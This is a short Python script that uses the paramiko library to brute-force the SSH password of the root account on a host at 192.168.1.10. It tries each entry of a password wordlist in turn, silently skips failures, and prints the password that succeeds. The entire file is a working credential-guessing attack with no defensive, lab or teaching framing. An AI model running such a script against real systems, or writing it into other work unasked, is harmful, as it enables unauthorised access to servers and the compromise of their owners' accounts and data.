import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = "192.168.1.10"
username = "root"
wordlist = open("passwords.txt").read().splitlines()

for password in wordlist:
    try:
        client.connect(ip, username=username, password=password)
        print("Password found:", password)
        break
    except:
        pass
